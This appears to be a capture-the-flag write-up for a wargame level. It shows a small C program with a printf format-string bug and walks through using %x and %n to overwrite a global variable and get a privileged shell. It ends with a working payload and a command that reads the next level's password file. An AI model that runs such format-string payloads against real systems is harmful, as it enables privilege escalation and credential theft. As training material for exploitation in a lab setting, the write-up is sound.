# Level3

## Code
```
#include <stdio.h>

int m;

void v(void) {
    char buffer[512];
    fgets(buffer, 512, stdin);
    printf(buffer);
    if (m == 64) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main(void) {
    v();
}
```

## Explanation

- In this level, we still have a binary that takes user input and prints it immediately after.

- This time, the program uses fgets, which is a much more secure way of getting user input since it
    specifies how many bytes to copy into the buffer, so it seemed difficult to use a buffer
    overflow again.

- We also noticed by looking at the assembly instructions that there was a call to
    system("/bin/sh") directly in the code, but that this instruction was "protected" by a cmp
    followed by a jne.

- Clearly, the solution here was therefore to make it so the cmp is true to avoid the jne and
    execute a shell with level4's privileges.

- The comparison itself is :    cmp    $0x40,%eax       ( 0x40 being 64 in hexa)
- The line before is :          mov    0x804988c,%eax

- In other words, we need to put the value 64 at the address 0804988c to win.

- Since we couldn't exploit fgets(), we figured out that the solution was to exploit printf() which was the only other call before the cmp instruction.

- What happens if you give printf() a string with format specifiers but no arguments ? Well, the
    function will try to get the arguments where they should be in the memory anyway, so this is
    something we can exploit.

- After playing with this idea for a bit, we tried to give the program this input :
    AAAA %X %X %X %X %X %X
- We got this output :
    AAAA 200 B7FD1AC0 B7FF37D0 41414141 20582520 25205825

- Here it's quite easy to notice where our format string's buffer starts, technically we could use as many %X as we want to go back up in the stack's addresses to read whatever we want to.

- This is quite cool already, but we don't just need to read what's in the memory, we need to write 
    "64" at a specific address, remember ?

- We didn't know about this before but printf() has a format specifier that allows us just that : %n
    %n writes the number of characters written so far at the variable address you give as argument.

- So technically, if we could write 64 characters and then insert a %n whose argument is the address 0x804988c, that would be perfect.

- The test we did earlier with AAAA helped us understand the beginning of the buffer corresponded to
    the fourth "%X" we gave as input, so here's the strategy to build our payload:

    +   4 bytes of the variable address we need to modify
    +   3 "%x" specifiers to jump to the address where our variable address is
    +   as many "A" (or any other) characters as needed to get to a total of 64
    +   a "%n" specifier to write "64" at the address given as "parameter"

Knowing all that, here's our final payload :

## Exploit
```
$   (python -c 'print "\x8c\x98\x04\x08" + "%x" * 3 + "A" * 41 + "%n"' ; cat) | ./level3
$   cat /home/user/level4/.pass
```